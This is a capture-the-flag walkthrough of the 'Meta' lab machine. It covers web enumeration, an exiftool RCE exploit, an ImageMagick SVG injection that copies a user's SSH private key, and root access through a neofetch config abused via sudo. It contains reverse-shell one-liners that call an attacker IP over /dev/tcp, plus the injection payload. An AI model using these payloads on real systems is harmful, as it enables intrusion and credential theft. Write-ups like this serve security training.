# Meta

First as usual, `nmap`.

```
# Nmap 7.92 scan initiated Fri Feb  4 15:36:20 2022 as: nmap -vvv -p 22,80 -sCV -oA init 10.10.11.140
Nmap scan report for 10.10.11.140
Host is up, received syn-ack (0.052s latency).
Scanned at 2022-02-04 15:36:34 +07 for 8s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCiNHVBq9XNN5eXFkQosElagVm6qkXg6Iryueb1zAywZIA4b0dX+5xR5FpAxvYPxmthXA0E7/wunblfjPekyeKg+lvb+rEiyUJH25W/In13zRfJ6Su/kgxw9whZ1YUlzFTWDjUjQBij7QSMktOcQLi7zgrkG3cxGcS39SrEM8tvxcuSzMwzhFqVKFP/AM0jAxJ5HQVrkXkpGR07rgLyd+cNQKOGnFpAukUJnjdfv9PsV+LQs9p+a0jID+5B9y5fP4w9PvYZUkRGHcKCefYk/2UUVn0HesLNNrfo6iUxu+eeM9EGUtqQZ8nXI54nHOvzbc4aFbxADCfew/UJzQT7rovB
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEDINAHjreE4lgZywOGusB8uOKvVDmVkgznoDmUI7Rrnlmpy6DnOUhov0HfQVG6U6B4AxCGaGkKTbS0tFE8hYis=
|   256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINdX83J9TLR63TPxQSvi3CuobX8uyKodvj26kl9jWUSq
80/tcp open  http    syn-ack Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://artcorp.htb
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb  4 15:36:42 2022 -- 1 IP address (1 host up) scanned in 21.63 seconds
```

Visiting the website on port 80, we're immediately redirected to `artcorp.htb` so we add that to our `/etc/hosts` and continue. Since we have a domain name, I went and fuzz for subdomains.

```sh
$ ffuf -u 'http://artcorp.htb/' -H "Host: FUZZ.artcorp.htb" -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 0
dev01                   [Status: 200, Size: 247, Words: 16, Lines: 10, Duration: 44ms]
```

Since `http://artcorp.htb/` has `index.html`, we can also fuzz for files and directories with `.html`.

```sh
$ gobuster dir -u http://artcorp.htb/ -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html

/assets               (Status: 301) [Size: 234] [--> http://artcorp.htb/assets/]
/css                  (Status: 301) [Size: 231] [--> http://artcorp.htb/css/]
/index.html           (Status: 200) [Size: 4427]
/server-status        (Status: 403) [Size: 199]
```

Nothing useful there. Going to `http://dev01.artcorp.htb/`, there's only a link to `/metaview/` which allows for file upload. It's always good to have enumeration in the background so we'll also run `gobuster` on this site. Since there's `index.php`, we'll run it with that extension.

```sh
$ gobuster dir -u 'http://dev01.artcorp.htb/' -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -r -x php
/index.php            (Status: 200) [Size: 247]
/server-status        (Status: 403) [Size: 199]

$ gobuster dir -u 'http://dev01.artcorp.htb/metaview/' -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -r -x php
/index.php            (Status: 200) [Size: 1404]
```

No interesting file/directory to be found. The page `/metaview/` seems to allow us to upload images and does something to view their metadata. We can try uploading a PHP file, changing the `Contect-Type` header to `image/png` and naming the file `rev.png.php` but the server would just complain saying `File not allowed (only jpg/png).`. When we upload a valid PNG file, the server would show us its metadata similar to `exiftool`'s output though not quite the same as when we run `exiftool` on the image ourselves. Since this is a PHP application and "Meta" is the name of the box, we can try embedding PHP code in an image's metadata with `exiftool` and upload that.

```sh
$ exiftool rev.png -comment="<?php system('id');?>"
    1 image files updated

$ exiftool rev.png
ExifTool Version Number         : 12.30
File Name                       : rev.png
Directory                       : .
File Size                       : 131 bytes
File Modification Date/Time     : 2022:02:04 16:01:57+07:00
File Access Date/Time           : 2022:02:04 16:02:02+07:00
File Inode Change Date/Time     : 2022:02:04 16:01:57+07:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 14
Image Height                    : 6
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Pixels Per Unit X               : 3780
Pixels Per Unit Y               : 3780
Pixel Units                     : meters
Comment                         : <?php system('id');?>
Image Size                      : 14x6
Megapixels                      : 0.000084
```

However, after uploading the file, the server doesn't seem to return the output of `id` in the metadata. I also tried using a reverse shell ...

```sh
$ exiftool rev.png -comment="<?php system(\"/bin/bash -c 'exec /bin/bash -i &>/dev/tcp/10.10.14.12/1337 <&1'\");?>"
```

... though that  didn't give us a shell either. Looking at the "Comment" line of the metadata from the server though, we only see `/dev/tcp/10.10.14.12/1337 <&1'");?>` so maybe it just got truncated to the last 39 characters. Since `"<?php system('');?>"` takes up 23 characters, leaving us with a mere 16 characters for the shell, there's not much space to play with. Looking back at trying with `<?php system('id');?>` and `<?php system($_GET["cmd"]);?`, the whole comments aren't show on the page at all so PHP code might get removed altogether after the truncation, unless they're just not shown because they're executed as PHP code at some point.

Looking up "php exiftool exploit", I found [this article on exiftool RCE](https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/). Also, looking up just "exiftool exploit" got me [this exploit](https://github.com/convisolabs/CVE-2021-22204-exiftool) which can easily set us up for an easy RCE. After changing the IP and port, running the exploit, setting up a listener, and uploading the generated `image.jpg`, I got a shell on the machine as `www-data`.

Checking `/home` and `/etc/passwd`, we see there's the user `thomas` which we probably need to privesc to. In his home is `.config/neofetch/config.conf`, and we're able to run `neofetch` on the machine. Not much can be done with it though, at least at this point. After some more looking around without results, I uploaded and ran `pspy`. Not much waiting later, I saw an interesting event.

```
2022/02/04 04:43:01 CMD: UID=1000 PID=15487  | /bin/bash /usr/local/bin/convert_images.sh
```

Checking the file `/usr/local/bin/convert_images.sh` ...

```sh
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
```

... we see that `/usr/local/bin/mogrify` from `ImageMagick` is being run on files inside `/var/www/dev01.artcorp.htb/convert_images/`. After some searching around on DuckDuckGo, searching "imagemagick injection" leads to [this ImageMagick issue](https://github.com/ImageMagick/ImageMagick/discussions/2851) which then leads to [this blog post](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html) detailing how to get shell injection. Using the provided PoC, I put `poc.svg` in `/var/www/dev01.artcorp.htb/convert_images/` (note that `/tmp/` doesn't work so I used `/dev/shm/` instead) and waited and got the `id` output. After the confirmation, the following `poc.svg` was used to grab thomas's SSH key.

```svg
<image authenticate='ff" `cat /home/thomas/.ssh/id_rsa > /dev/shm/thomas`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

With that, we should be able to SSH in as thomas. Checking our `sudo` privileges ...

```sh
thomas@meta:~$ sudo -l
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"
```

We can run `neofetch` as root with no password. Additionally, `env_keep+=XDG_CONFIG_HOME` is kept, meaning when `neofetch` is run with `sudo`, it will use thomas's `XDG_CONFIG_HOME` which can be set to `/home/thomas/.config/`. Looking at [the neofetch wiki's Customizing-Info page](https://github.com/dylanaraps/neofetch/wiki/Customizing-Info#prin), we see that we can have `neofetch` run custom commands so I added a reverse shell line at the end of `print_info()`.

```
print_info() {
    info title
    info underline

    info "OS" distro
    info "Host" model
    info "Kernel" kernel
    info "Uptime" uptime
    info "Packages" packages
    info "Shell" shell
    info "Resolution" resolution
    info "DE" de
    info "WM" wm
    info "WM Theme" wm_theme
    info "Theme" theme
    info "Icons" icons
    info "Terminal" term
    info "Terminal Font" term_font
    info "CPU" cpu
    info "GPU" gpu
    info "Memory" memory

    # info "GPU Driver" gpu_driver  # Linux/macOS only
    # info "CPU Usage" cpu_usage
    # info "Disk" disk
    # info "Battery" battery
    # info "Font" font
    # info "Song" song
    # [[ $player ]] && prin "Music Player" "$player"
    # info "Local IP" local_ip
    # info "Public IP" public_ip
    # info "Users" users
    # info "Locale" locale  # This only works on glibc systems.

    info cols
    prin "root" "$(bash -c 'exec bash -i &>/dev/tcp/LHOST/LPORT <&1')"
}
```

After that, simply set up a listener and run `XDG_CONFIG_HOME=/home/thomas/.config/ sudo neofetch` to get a shell as root on the machine.
